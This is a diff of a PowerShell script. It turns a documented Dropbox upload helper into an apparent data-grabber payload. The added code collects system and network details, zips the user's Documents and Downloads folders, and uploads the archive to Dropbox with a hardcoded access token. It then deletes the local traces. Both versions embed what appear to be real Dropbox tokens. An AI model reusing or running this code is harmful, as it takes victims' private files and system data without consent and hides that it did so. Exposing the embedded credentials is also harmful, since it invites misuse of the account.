@@ -1,70 +1,41 @@
-<#
-.SYNOPSIS
-This is a PowerShell script to upload a file to Dropbox using their REST API.
+# Get the system locale
+$systemLocale = Get-WinSystemLocale
 
-.DESCRIPTION
-This PowerShell script will upload   
- a file to Dropbox using their REST API with the parameters you provide.
+# Set the keyboard layout to match the system locale
+try {
+    $layout = New-WinUserLanguageList -Language $systemLocale.Name 
+    Set-WinUserLanguageList $layout -Force
+    Write-Host "Keyboard layout set to $($systemLocale.DisplayName)"
+} catch {
+    Write-Error "Error setting keyboard layout: $($_.Exception.Message)"
+}
 
-.PARAMETER SourceFilePath
-The path of the file to upload.
+# Output File Path
+$outputFilePath = "$env:USERPROFILE\Downloads\System_Info.txt"
 
-.PARAMETER TargetFilePath
-The path of the file on Dropbox.
+# Gather System Information (with UTF-8 encoding)
+Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsName, OsManufacturer, CsName | Out-File -FilePath $outputFilePath -Encoding UTF8
+Get-NetIPAddress | Select-Object InterfaceAlias, IPAddress, PrefixLength | Out-File -FilePath $outputFilePath -Append -Encoding UTF8
+Get-NetAdapter | Select-Object Name, InterfaceDescription, MacAddress, Status | Out-File -FilePath $outputFilePath -Append -Encoding UTF8
+Get-WmiObject -Class Win32_Processor | Select-Object Name, Manufacturer, NumberOfCores, NumberOfLogicalProcessors | Out-File -FilePath $outputFilePath -Append -Encoding UTF8
+Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object Sum | Out-File -FilePath $outputFilePath -Append -Encoding UTF8
+Get-WmiObject -Class Win32_DiskDrive | Select-Object Model, Size, MediaType | Out-File -FilePath $outputFilePath -Append -Encoding UTF8
+Get-WinHomeLocation | Out-File -FilePath $outputFilePath -Append -Encoding UTF8
+Get-WinSystemLocale | Out-File -FilePath $outputFilePath -Append -Encoding UTF8
+$currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent()) | Out-File -FilePath $outputFilePath -Append -Encoding UTF8
+$currentUser.Identity.Name | Out-File -FilePath $outputFilePath -Append -Encoding UTF8
+Get-Process | Out-File -FilePath $outputFilePath -Append -Encoding UTF8
+Get-Service | Out-File -FilePath $outputFilePath -Append -Encoding UTF8
 
-.ENV PARAMETER DropBoxAccessToken
-The Dropbox access token.   
-
-#>
-
-$sourceFilePath = "$env:USERPROFILE\Downloads\output_filename.txt"
-$targetFilePath = "/Scripts/output.txt" # Uploads to the "/Scripts" folder in your Dropbox
-
-Param(
-    [Parameter(Mandatory = $true)]
-    [string]$SourceFilePath,
-    [Parameter(Mandatory = $true)]
-    [string]$TargetFilePath 
-)
-
-# Gather System Information
-Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsName, OsManufacturer, CsName | Out-File -FilePath $sourceFilePath
-Get-NetIPAddress | Select-Object InterfaceAlias, IPAddress, PrefixLength >> $sourceFilePath
-Get-NetAdapter | Select-Object Name, InterfaceDescription, MacAddress, Status >> $sourceFilePath
-Get-WmiObject -Class Win32_Processor | Select-Object Name, Manufacturer, NumberOfCores, NumberOfLogicalProcessors >> $sourceFilePath
-Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object Sum >> $sourceFilePath
-Get-WmiObject -Class Win32_DiskDrive | Select-Object Model, Size, MediaType >> $sourceFilePath
-Get-WinHomeLocation >> $sourceFilePath
-Get-WinSystemLocale >> $sourceFilePath
-$currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent()) >> $sourceFilePath
-$currentUser.Identity.Name >> $sourceFilePath
-Get-Process >> $sourceFilePath
-Get-Service >> $sourceFilePath
-
-
-# Construct the Dropbox-API-Arg JSON
+Compress-Archive -Path "$env:USERPROFILE\Documents\*", "$env:USERPROFILE\Downloads\*", "$outputFilePath" -CompressionLevel Fastest -DestinationPath $env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip
+$TargetFilePath="/$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
+$SourceFilePath="$env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
 $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-
-# Retrieve the Dropbox access token from the environment variable
-$authorization = "Bearer " + (Get-Item env:DropBoxAccessToken).Value
-
-# Create the headers for the request
+$authorization = "Bearer " + "sl.B7s2M8tm3oNFUmJbHIxo0Si5XXPaCQUPl9RKrmbQP3fIKoL4Z39P0ZBsDmG8dBQrGhFwSFV0sQaBHQPABJEWFcJVx8mN0sgkK2h2QYlRSHX2KR8kblJkxcFz7LmRbzWQ5T-rAkc1Pt07Jcw"
 $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
 $headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg",   
- $arg)
-$headers.Add("Content-Type", 'application/octet-stream')   
-
-
-# Make the API call to upload the file
-try {
-    $response = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-    Write-Host "File uploaded to Dropbox successfully!"
-}
-catch {
-    Write-Error "Error uploading file to Dropbox: $($_.Exception.Message)"
-}
-
-# Dropbox Configuration 
-$env:DropBoxAccessToken = "sl.B7u1ZplIi39ac68T5sH_qg6EH0qBa_atBBXpK0408D0cU98Rw7N5TvT3hLUgJBqMFuabqKugjD58cj4bJagxg_LOHxG1xkj7NTE5O32EXxsCEV-EMiMGoGKRq9CwR9Zd2eXNzx3eptwbpC4"
-$dropboxFolderPath = "/Scripts"
+$headers.Add("Dropbox-API-Arg", $arg)
+$headers.Add("Content-Type", 'application/octet-stream')
+Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+rm $SourceFilePath
+rm $outputFilePath
